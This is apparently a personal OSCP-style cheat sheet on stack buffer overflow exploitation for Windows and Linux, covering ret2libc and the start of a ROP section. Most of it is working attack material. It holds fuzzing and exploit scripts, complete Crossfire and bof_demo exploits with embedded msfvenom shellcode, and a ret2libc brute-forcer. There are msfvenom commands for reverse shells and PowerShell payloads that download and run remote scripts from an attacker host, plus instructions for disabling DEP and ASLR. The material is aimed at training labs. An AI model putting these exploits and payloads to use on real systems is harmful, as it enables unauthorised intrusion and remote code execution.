# Buffer overflow

## Summarised steps

1\. Create a large buffer to trigger the overflow.

2\. Take control of EIP by overwriting a return address on the stack and  padding the large buffer with an appropriate offset.

3\. Include a chosen payload in the buffer prepended by optional NOP sleds.

4\. Choose a correct return address instruction such as JMP ESP (or different register) in order to redirect the execution flow into our payload.

## Fixing memory corruption exploits

```sh
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
# Run Windows executables on Linux
wine exploit.exe
```

{% hint style="danger" %}
Be careful with buffers, pointers... take into account that there migth be misalignments of 1 up to 4 bytes in order to work (sum or substract 1-2-3-4 bytes according to the specific case).
{% endhint %}

### Changing return address

As an alternative, we could obtain a return address directly from the target machine. If we have access to our target as an unprivileged user and want to run an exploit that will elevate our privileges, we can copy the DLLs that we are interested into our attack machine and use various tools such as disassemblers or even _msfpescan._

[https://www.offensive-security.com/metasploit-unleashed/exploit-targets/](https://www.offensive-security.com/metasploit-unleashed/exploit-targets/)

## Windows

[https://www.youtube.com/watch?v=L29nzSzWdGM](https://www.youtube.com/watch?v=L29nzSzWdGM)

{% hint style="danger" %}
If bof is .exe on Linux (using Wine most likely), try both Windows and Linux payloads on msfvenom, it might be Linux payload!!!
{% endhint %}

{% tabs %}
{% tab title="Cheatsheet" %}
{% code overflow="wrap" fullWidth="true" %}
```bash
python -c 'print "A" * 800 + "\x00"' | nc $box 1985
!mona config -set workingfolder c:\bof\%p
msf-pattern_create -l 2000
msf-pattern_offset -l 2000 -q 316A4130
!mona compare -f $.bin_file_path -a $ESP # we note the badchar, ESP w/o 0x
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.0 LPORT=80 EXITFUNC=thread -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c --smallest
```
{% endcode %}
{% endtab %}

{% tab title="Fuzzer" %}
<pre class="language-python" data-overflow="wrap" data-full-width="true"><code class="lang-python"># Easy way to test first
python -c 'print "A" * 800 + "\x00"' | nc $box 1985
# DO NOT TRY A HUGE value as fuzzer or it might not work

<strong># Check options in case bof needs a prefix or a previous action to be able to trigger it.
</strong>
# --------USE PYTHON3 TO RUN IT
# We use Immunity Debbuger (run as admin) and Mona script.
# We open the .exe with Immunity Debugger and run it. We create our fuzzing script:

<strong># Remember to change to binary mode in ftp before using get otherwise you will have issues running the exe
</strong>

#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.152.83"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
  
# -----------------------------------  
# ANOTHER FUZZER
#!/usr/bin/python
import socket
import time
import sys

size = 100 

while(size &#x3C; 2500):
    try:
        print "\nSending evil buffer with %s bytes" % size
        buffer = "TRUN ."
        buffer += "A" * size

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect(("192.168.0.17", 9999))
        s.send(buffer)

        s.close()

        size +=100
        time.sleep(3)

    except:
        print "\nCould not connect!"
        sys.exit()
</code></pre>
{% endtab %}

{% tab title="OSCP way" %}
{% hint style="warning" %}
BE VERY CAREFUL IF THE BADCHARS LIST FROM MONA HAS CONSECUTIVE BADCHARS, IT IS MOST LIKELY TO BE JUST THE FIRST ONE

With badchars start with all and first remove \x00 from the list, if we remove several at once and not one by one, it might fail.
{% endhint %}

{% hint style="info" %}
Default location for bytearray.txt
{% endhint %}

```
C:\Users\$user\AppData\Local\VirtualStore\Program Files\Immunity Inc\Immunity Debugger
```

```sh
msf-pattern_create -l 800
msf-pattern_offset -l $LENGTH -q $EIP_BYTES # -q w/o 0x
```

Python script to write all badchars into a file (USE THIS FORMAT TO TEST BADCHARS ON A SCRIPT IF THE OTHER FAILS):

```python
#!/usr/bin/python3

badchars =  b""
badchars += b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
badchars += b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
badchars += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
badchars += b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
badchars += b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
badchars += b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
badchars += b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
badchars += b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
badchars += b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
badchars += b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
badchars += b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
badchars += b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
badchars += b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
badchars += b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
badchars += b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
badchars += b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

f = open("exploit.txt", "wb") 
f.write(badchars)
f.close()
```

USEFUL PYTHON FUNCTIONS

```python
# Binary-mode writing
bad = b"\x00"
f = open("file.txt", "wb")
f.write(bad)
f.close

# Encode offset to make it binary compatible
offset = "A" * 1804
offset = offset.encode('utf-8')
retn = b"\x42\x42\x42\x42"
padding = b"\x90" * 16
payload = b""
...
f = open("file.txt", "wb")
f.write(offset)
f.write(retn)
f.write(padding)
f.write(payload)
f.close()
```

s4vitar mode use **msf-nasm\_shell** (upgraded command) // choose a module with a base address that does not contain any of our bad characters

{% code overflow="wrap" %}
```bash
# Generating shellcode with msfvenom (Metasploit)
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
https://blog.rapid7.com/2014/12/09/good-bye-msfpayload-and-msfencode/
https://www.offensive-security.com/metasploit-unleashed/msfpayload/
https://www.offensive-security.com/metasploit-unleashed/msfencode/
https://www.rapid7.com/db/modules/encoder/x86/shikata_ga_nai
```
{% endcode %}
{% endtab %}

{% tab title="pry fuzzer" %}
```ruby
# IN CASE THE FUZZER DOES NOT WORK --> install pry on kali
pry --simple-prompt
require 'socket'
s=TCPSocket.new("$IP",$port)
# buffer = prefix + overflow + retn + padding + payload + postfix
s.puts "$STRING_VARIABLE"

# ----------EXPLOIT SCRIPT IN RUBY (exploit.rb)
prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
end = "\r\n"

buffer = prefix + overflow + retn + padding + payload + end

require 'socket'

TCPSocket.open("$IP", $port){ |s| s.puts buffer }
```
{% endtab %}

{% tab title="Small template" %}
```python
#!/usr/bin/python3

filler = b"A" * 2222
# eip = b"\x01\x02\x03\x04"
# eip = b"B" * 16

inputBuffer = filler + eip

f = open("exploit.txt", "wb")
f.write(inputBuffer)
f.close()
```
{% endtab %}

{% tab title="Exploit" %}
{% code overflow="wrap" %}
```python
# We execute it until it crashes. We note the number of bytes. Then we create exploit.py:
# USE PYTHON BOF.PY (NOT PYTHON3)
import socket

ip = "10.10.152.83"
port = 1337

prefix = "" # "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
end = "\r\n" # optional, sth at the end might be needed or not

buffer = prefix + overflow + retn + padding + payload + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(buffer)
  s.recv(1024)
  s.close
  print("Done!")
except:
  print("Could not connect.")
```
{% endcode %}
{% endtab %}

{% tab title="Offset EIP" %}
{% code overflow="wrap" %}
```bash
# Now we generate a payload 400 bytes longer than when it crashed before:
msf-pattern_create -l $CRASH_VALUE+400
# We put in the payload variable and execute exploit.py. Then we check EIP:
msf-pattern_offset -l -l $CRASH_VALUE+400 -q $EIP

# Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. 

# Set the retn variable to "BBBB", restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).
```
{% endcode %}
{% endtab %}

{% tab title="Badchars" %}
{% code overflow="wrap" %}
```bash
# We config dir with mona first (set all rights to that folder just in case)
!mona config -set workingfolder c:\bof\%p
# Use this as general approach in case there is no space for normal reverse_tcp_shell, always exclude at least these badchars (at least null byte for sure) + the ones found manually
└─$ msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.Webclient).downloadString('http://$IP:8000/Inv-Pow.ps1')" LHOST=192.168.0.0 LPORT=80 EXITFUNC=thread -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c --smallest

# After crashing the program, set the working directory
!mona config -set working folder c:\mona\%p

# Generate a bytearray using mona, and exclude the null byte (\x00) by default.
!mona bytearray -cpb "\x00"

# IF WORKING DIRECTORY FAILS, USE THE DEFAULT FOR !mona compare -f $PATH 
C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin

# KEEP retn="BBBB", update your exploit.py script and set the payload variable to the string of bad chars the script generates.
payload=("ALL BADCHARS HERE")     # DON'T FORGET ()

# Restart the app in Immunity and run the modified exploit.py script again. 
# Make a note of the address to which the ESP register points.
!mona compare -f $.bin_file_path -a $ESP # we note the badchar, ESP w/o 0x
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
# A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it.

# Note badchars and generate a new bytearray in mona, specifying these new badchars along with \x00. For example:
!mona bytearray -cpb "\x00\x07" # we delete all badchars (00 07 in this case) 
# Then update the payload variable and remove new badchars.

# DELETE BADCHARS ONE BY ONE FROM BYTEARRAY. NOT ALL MIGHT BE BADCHARS! SOMETIMES BADCHARS AFFECT THE NEXT BYTE OR THE REST OF THE STRING

# NOTE: ESP ADDRESS MAY CHANGE EVERY TIME WE RUN THE APP
# If we check twice JMP ESP address and see it is constantly changing, we have to disable ASLR on our Kali
# First remember the value it had to revert it later
cat /proc/sys/kernel/randomize_va_space
# Now we disable random relocation on Kali
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# Then we can repeat the method to find a return address
We find 0x5e9a515e so our retn
retn = b"\x5e\x51\x9a\x5e"

# ANOTHER METHOD TO FIND BADCHARS
# Crash the program > ESP > Follow in dump > Note the badchars next to "21". Maybe "21" means nothing but for sure the badchars stand out there.

# We execute the exploit again and check the badchars until we see unmodified:
!mona compare -f $.bin_file_path -a $ESP # we note the badchar, ESP w/o 0x
```
{% endcode %}

{% hint style="info" %}
Be careful with consecutive badchars, try to not consider the second one of those consecutive.
{% endhint %}

![](<../.gitbook/assets/image (89).png>)

{% code overflow="wrap" %}
```bash
!mona compare -f "C:\Users\student\AppData\Local\VirtualStore\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin" -a $ESP
!mona bytearray -cpb "\x00\x0a\x1a\x2f\x80\x95\xa7"
```
{% endcode %}
{% endtab %}

{% tab title="JMP ESP" %}
{% code overflow="wrap" %}
```bash
# FINDING A JUMP POINT
!mona jmp -r esp -cpb "\xBADCHARS"
# Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). 
from struct import pack 
pack("<L", 0x$ADDRESS)

# GENERATE PAYLOAD (IF TRYING ON WIN DEB MACHINE, CHECK REAL LOCAL IP W/O VPN)
# Use this as general approach, always exclude at least these badchars (at least null byte for sure) + the ones found manually
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.Webclient).downloadString('http://$IP:8000/Inv-Pow.ps1')" LHOST=192.168.0.0 LPORT=80 EXITFUNC=thread -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c --smallest
# Another way without PS
msfvenom -p windows/shell_reverse_tcp
# Linux payload (IN CASE OF WINE INSTANCE IT MIGHT BE THE ONLY OPTION)
msfvenom -p linux/x86/shell_reverse_tcp ... #x86 or x64 depending on arch
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.Webclient).downloadString('http://10.0.2.5/Inv-Pow.ps1')" LHOST= LPORT= EXITFUNC=thread -b "\x.." -f c --smallest
# Copy the generated C code into your exploit.py script payload variable

# PREPEND NOPS
# Since an encoder was likely used to generate the payload, you will need space in memory for the payload to unpack itself. 16 or more "No Operation" (\x90) bytes:
padding = "\x90" * 16
```
{% endcode %}
{% endtab %}

{% tab title="s4vitar mode" %}
{% code overflow="wrap" %}
```sh
https://www.youtube.com/watch?v=sdZ8aE7yxMk&list=WL&index=29

# Enable rules in-bound and out-bound for ICMP traffic
Firewall > File and Printer Sharing (Echo ... ICMP...) > Enable rule (4 rules)

# Ping the W7 machine to check it's set correctly
cmd > bcdedit /set {currrent} nx AlwaysOff // disable DEP
# bootcfg /raw /id 1 "/noexecute=alwaysoff" in Win XP

# Install slmail
Create new rule to allow inbound-outbound traffic on ports 25,110
Scan your Windows machine with nmap
Download Immunity Debugger, run it as admin
searchsploit slmail
download mona > copy mona.py inside ImmunityDebugger\Pycommands folder
Run Slmail as admin
Establish a socket connection --> take exploit.py, do not forget \r\n

# NOTE: IF THE BINARY CRASHES BUT THE EIP IS NOT OVERWRITTEN WITH OUR PAYLOAD 
(41414141 IF "A") --> INCREASE THE COUNTER (SUM MORE EVERY ITER) COUN=COUN+350 

When we know approx nº bytes for the program to crash --> modify the script
to include pattern_create.rb -l 2500 (if we know the program crashes with that)

Then when it crashes, note EIP result and do pattern_offset -l 2500 -q $EIP and
we get the offset.

We check it by doing buffer = "A"*offset + "B"*4 --> we should see 42424242 in EIP

Now in Immunity Debbuger --> !mona config -set workingfolder c:\mona\%p
# NOTE: The working folder will be created there with the name of the process after executing the comand below:
!mona bytearray
We copy all those bytes to the exploit.py as a new variable badchars
Run the exploit again with that badchars variable
badchars=("ALL THE BADCHARS HERE")
buffer = "A"*2606 + "B"*4 + badchars

!mona compare -f $.bin_file_path -a $ESP // we note the badchar, ESP w/o 0x
!mona bytearray -cpb "\x00" //we delete that/those badchars (00 for example)

# Then we remove that badchar from our badchar in exploit.py and run it again
!mona compare -f $.bin_file_path -a $ESP # we note the badchar
!mona bytearray -cpb "\x00\x0a" # now we have to add the badchars consecutively
# We also remove that, the last badchar we saw, from exploit.py

# We repeat this process until mona says there are no more badchars

#Then we create our shellcode:
msfvenom -p windows/shell_reverse_tcp lhost=10.0.2.5 lport=443 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c 
# IF MSFVENOM SAYS IT WAS NOT POSSIBLE TO GENERATE SHELLCODE--> don't use -e (encoder)

#We remove the variable badchars and replace it for our variable shellcode. Later we need the opcode instead of "B"*4 to overwrite the EIP and go to a jump that will execute our shellcode (EIP will point to JMP ESP)
`locate nasm_shell.rb` 
nasm > jmp ESP // we note the opcode
with !mona modules we can list modules, see DLLs, protections and so on
# We choose a module without protections
!mona find -s "\xff\xe4" -m $MODULE // in case the opcode from nasm was FFE4
# Then mona will say "Found a total of X pointers", choose one pointer w/o badchars

from struct import pack # and use this instead of "B"*4 (EIP)
pack("<L", 0x$ESP_POINTER) # write the esp address in little-endian format

# Finally, we need NOPs to say no operation and give time to the shellcode in order to be reorganised and properly interpreted. 

# NOTE: if we have a connection with nc but no shell --> check and change payload

# But we cannot exploit the bof again --> add to msfvenom, before lhost, the parameter
EXITFUNC=thread // it kills a thread and not the process when it connects

# IMPROVEMENTS:
# *****Instead of NOPs, it's better to move the stack so the program has that "space" 
to decode and interpret our shellcode
`locate nasm_shell.rb`
nasm > sub esp,0x10 // note the opcode 
Then in our exploit.py put the opcode directly instead of the nops
buffer = ... + "\x83\xEC\x10" + "" + shellcode //// in case the opcode is 83EC10
*****Customize your payload to make it smaller with CMD and --smallest
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.Webclient).downloadString('http://10.0.2.5/Inv-Pow.ps1')" EXITFUNC=thread lhost=10.0.2.5 lport=4
43 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c --smallest
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Escape from Wine instance

Search for **/bin** Linux executables to use **nc** and get a revshell or try some Windows commands.

## Linux

{% tabs %}
{% tab title="Intro" %}
```python
# CHECK IF ASLR IS ENABLED ON THE VICTIM MACHINE
cat /proc/sys/kernel/randomize_va_space #0=disabled, good for testing bof

# TEST IF THE PROGRAM CRASHES AND WHEN
./file $(python -c 'print "A" * 100')
./file $(python -c 'print "A" * 200')
.......

# USE GDB-PEDA
gdb -q bof_demo
    r (ALL THE CHARS)
    Then note EIP

`locate pattern_offset` -q $EIP // put rbp value here

# COMPILE BOF WITH NO PROTECTIONS
echo 0 > /proc/sys/kernel/randomize_va_space # revert it later
gcc bof_demo.c -o bof_demo -z execstack -fno-stack-protector
```
{% endtab %}

{% tab title="OSCP way" %}
{% code overflow="wrap" %}
```bash
https://www.exploit-db.com/exploits/1582/
https://github.com/eteran/edb-debugger
https://en.wikipedia.org/wiki/OllyDbg

# DEP, ASLR and Canaries disabled
https://en.wikipedia.org/wiki/Executable_space_protection
https://en.wikipedia.org/wiki/Address_space_layout_randomization
https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries
# 1 - Run Crossfire example
# 2 - Use edb debugger to attach the process and run it (press twice if it stops)
edb
File > Attach > (attach the running process)


# Crossfire PoC
#!/usr/bin/python
import socket
host = "10.11.0.128"
crash = "\x41" * 4379
buffer = "\x11(setup sound " + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"


# Controlling EIP
msf-pattern_create -l $LENGTH
msf-pattern_offset -q $EIP # EIP address after crashing w/o 0x
# Then if we input an address to the script, use \x notation and little-endian approach


# Locating space for our shellcode
- Check if there is a register with some bytes of our shellcode and how many bytes we have
- If EAX has the beginning of the script, we can add a value to EAX and point to the beggining of the real shellcode
msf-nasm_shell
nasm > add eax,12
00000000  83C00C            add eax,byte +0xc
nasm > jmp eax
00000000  FFE0              jmp eax
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#" #\x90 is a NOP to maintain correct length


# Checking for Bad Characters
Send the whole range of characters from 00 to FF within our buffer and then monitored whether any of those bytes got mangled, swapped, dropped, or changed in memory.
After running PoC multiple times and eliminating one bad character at a time, we come up with a final list of badchars.
# Two ways: using gdb-gef or edb
1 Generate sort badchars with Python script
2.a Run the binary with gdb-gef, crash, check ESP register with x/100x $esp and check stack to find badchars
2.b Run the binary with edb, crash it and check stack to find badchars (they do not appear on the stack or other hex values are replacing them there)
3. Generate shellcode w/o badchars
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.0 LPORT=22 EXITFUNC=thread -b "\x00" -f raw -o shellcode
4. Deliver the payload (one way is shown here that is only applicable to certain cases)
cat shellcode - | nc 192.168.0.0 8000


# Finding a Return Address
EDB > Plugins > OpCodeSearcher
- Select Jump Equivalent ESP -> EIP
- Choose a region with at least read and execute permissions
- Once we find JMP ESP instruction, write it backwards on the retn variable
# NOTE: If we check twice JMP ESP address and see it is constantly changing, we have to disable ASLR on our Kali
# First remember the value it had to revert it later
cat /proc/sys/kernel/randomize_va_space
# Now we disable random relocation on Kali
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# Then we can repeat the method to find a return address
We find 0x5e9a515e so our retn
retn = b"\x5e\x51\x9a\x5e"
# To check if works
- Set a breakpoint on that JMP ESP address (EDB > Plugins > Breakpoint Manager)
- When it reaches that BP, check if EIP has that value
- Single step-into to enter the ESP and check if EAX points at the beginning of our code


# Getting a shell (be careful with architecture x86/x64 and payload staged/non-staged)
https://www.win.tue.nl/~aeb/linux/lk/lk-5.html
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.195 LPORT=5000 EXITFUNC=thread -b "\x00\x0a\x0d\x1a\x20\x43\x75\x9e\xbc" -f py -v shellcode

# We have to prepend some NOPs to make some space
nops = b"\x90" * 16


# AND THIS IS THE FINAL SCRIPT:
#!/usr/bin/python3

offset = "A" * 98
offset = offset.encode('utf-8')

retn = b"\x5e\x51\x9a\x5e"

nops = b"\x90" * 16

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.195 LPORT=5000 EXITFUNC=thread -b "\x00\x0a\x0d\x1a\x20\x43\x75\x9e\xbc" -f py -v shellcode
shellcode =  b""
shellcode += b"\x29\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x8f\x3b\x07\x03\x83\xee\xfc"
shellcode += b"\xe2\xf4\xbe\xe0\xf0\xe0\xdc\x78\x54\x69\x8d"
shellcode += b"\xb2\xe6\xb3\xe9\xf6\x87\x90\xd6\x8b\x38\xce"
shellcode += b"\x0f\x72\x7e\xfa\xe7\xfb\xaf\x74\x4c\x53\x05"
shellcode += b"\x03\x9c\xb3\x8e\xe2\x3f\x5d\x57\x52\xdc\x88"
shellcode += b"\x04\x8a\x6e\xf6\x87\x51\xe7\x55\x28\x70\xe7"
shellcode += b"\x53\x28\x2c\xed\x52\x8e\xe0\xdd\x68\x8e\xe2"
shellcode += b"\x3f\x30\xca\x83"

f = open("exploit.txt", "wb") 
f.write(offset)
f.write(retn)
f.write(nops)
f.write(shellcode)
f.close()


# We execute the binary and get a revshell. Now we try it on the target:
└─$ cat exploit.txt - | nc 192.168.195.52 5000


# Final script (Crossfire example)
#!/usr/bin/python

import socket

host = "10.11.0.128"

nop_sled = "\x90" * 8  # NOP sled

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py

shellcode =  ""
shellcode += "\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"
shellcode += "\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41"
shellcode += "\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71"
shellcode += "\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04"
shellcode += "\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d"
shellcode += "\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72"
shellcode += "\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34"
shellcode += "\x7f\x6d\x02\x36"

padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))
eip = "\x96\x45\x13\x08"  # 0x08134596
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"
```
{% endcode %}
{% endtab %}

{% tab title="ret2libc" %}
{% hint style="info" %}
If `cat /proc/sys/kernel/randomize_va_space` > 0, do

```
ldd /path/to/buffer/overflow/binary | grep libc
```

several times to see if randomization is very wide or just some bytes (total randomization might make not possible this approach).
{% endhint %}

ret-to-libc technique, which is used to exploit buffer overflow vulnerabilities on systems where **stack memory is protected with no execute (NX) bit**.

Use this overflow technique instead of the basic stack-based when **NX enabled**.

```sh
└─$ checksec binary-overflow                                                                                                                           
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

<pre class="language-python"><code class="lang-python"><strong>########### Brute force libc base address (ret2libc attack)
</strong>#!/usr/bin/env python2
import struct
from subprocess import call

libc_base_addr = 0xd497a000      # ldd /usr/bin/binary | grep libc
# choose an average value if needed // if not found ALTERNATIVE find / -name libc.so.6 OR gdb binary > p exit
exit_off = 0x0001f7b0            # readelf -s /lib32/libc.so.6 | grep exit
system_off = 0x0003a450          # readelf -s /lib32/libc.so.6 | grep system
system_addr = libc_base_addr + system_off
exit_addr = libc_base_addr + exit_off
system_arg = libc_base_addr + 0x15900b # strings -a -t x /lib32/libc.so.6 | grep '/bin/sh'

#endianess convertion
def conv(num):
    return struct.pack("&#x3C;I",num)

# Junk + system + exit + system_arg
# For offset value below run msf-pattern_create -l 800 -> gdb ./binary -> r $OFFSET -> note crash/eip address 
# -> msf-pattern_offset -l 800 -q $CRASH_ADDRESS
buf = "A" * 512 # the offset before overwriting eip
# r (binary) (arguments) until we exactly overwrite the pointer (last line) of the 
# output
buf += conv(system_addr)
buf += conv(exit_addr)
buf += conv(system_arg)

print "Calling vulnerable program"

i = 0
while (i &#x3C; 256):
    print "Number of tries: %d" %i
    i += 1
    ret = call(["/usr/local/bin/overflow", buf]) # 1st arg is the binary path
    # Add more arguments inside call() if needed for the binary exploitation
    if (not ret):
        break
    else:
        print "Exploit failed"
</code></pre>
{% endtab %}

{% tab title="rip  addr" %}
```bash
# TEST IF THE PROGRAM CRASHES AND WHEN
./file $(python -c 'print "A" * 100')
./file $(python -c 'print "A" * 200')

python -c 'print "A"*1000' > fuzz.in
gdb -q bof_demo
    r < fuzz.in
    x $rbp # check rbp value
    x/100x $rsp-700 # rip = close address to the start of the buffer (414141...)Create a string of length 1000 using Metasploit:
```
{% endtab %}

{% tab title="Offset" %}
{% code overflow="wrap" %}
```bash
`locate pattern_create` -l1000 > fuzz_rbp.in
gdb bof_demo -q
    r < fuzz_rbp_in
    x $rbp # note this value

`locate pattern_offset` -q $rbp # put rbp value here
# With the command above we get the offset value. We just need to add +8 (64-bit) or +4 (32-bit)
```
{% endcode %}
{% endtab %}

{% tab title="Final payload" %}
Since, we now control the value of register **rip**, we can make it to do something meaningful, like spawning a shell.

Let’s use “msfvenom” to create a reverse tcp shellcode as shown in the figure.

{% code overflow="wrap" %}
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -b '\x00' -f python
```
{% endcode %}

Now it's time to create the final payload with Python:

```python
from struct import pack

payload_len = 616		
nop = "\x90"*300
rip = 0x00007fffffffdefc

buf =  ""
buf += "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\x4b\x39\x49\xc0\x26\xc4\xb7"
buf += "\x43\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\x21\x10\x11\x59\x4c\xc6\xe8\x29\x4a\x67\x46\xc5\x6e"
buf += "\x53\xff\xfa\x49\x39\x58\x9c\x59\xc4\xb7\x42\x1a\x71"
buf += "\xc0\x26\x4c\xd4\xed\x29\x61\x61\x46\xc5\x4c\xc7\xe9"
buf += "\x0b\xb4\xf7\x23\xe1\x7e\xcb\xb2\x36\xbd\x53\x72\x98"
buf += "\xbf\x8c\x0c\x6c\x29\x50\x27\xef\x55\xac\xb7\x10\x03"
buf += "\xb0\xae\x92\x71\x8c\x3e\xa5\x44\x3c\x49\xc0\x26\xc4"
buf += "\xb7\x43"


buf_len = len(buf)
nop_len = len(nop)
padding = "A"*(payload_len-nop_len-buf_len)

payload = nop + buf + padding + pack("<Q", rip)

print payload
```

In the above script, python’s struct module has been used to convert the address to little endian style. NOP slides are used to increase the chances of hitting the “**shellcode**”. Basically, if we point register **rip** to any address which points to an **NOP** (No Operation), then the CPU would just keep moving to the next instruction. The bigger the NOP slides, more chances that our guessed value for **rip** would hit an NOP and finally execute the shellcode.&#x20;

Also, some padding has been given just before overwriting the “return address” to ensure that there is some gap between the shellcode and the “return address”. This was necessary because near the “saved frame/base pointer” some bytes were not overwritten.&#x20;

Finally, start a listener and run the “bof\_demo\_exploit.py” file created earlier, and pipe the output to the “bof\_demo” binary.

```python
python bof_demo_exploit.py | ./bof_demo
```
{% endtab %}
{% endtabs %}

## ROP

{% tabs %}
{% tab title="Intro" %}
{% code overflow="wrap" %}
```bash
# CHECK BLACKGATE BOX FROM PG PRACTICE (SUDO PRIVS TO RUN A BINARY)
https://github.com/kavishkagihan/ROP-Buffer-overflow
https://medium.com/cyber-unbound/buffer-overflows-ret2libc-ret2plt-and-rop-e2695c103c4c

# We transfer the binary to our Kali/Windows to debug it. We check props with file. We will debug it using gdb with a plugin gdf:
https://hugsy.github.io/gef/
# A good guide about gdb:
https://github.com/D4mianWayne/PwnLand/blob/master/Debugging/chapter-1.md

# We debug the binary and check available functions with i functions. We can see the function names since the binary isn't stripped, which makes debugging easier:
└─$ gdb-gef ./binary-file
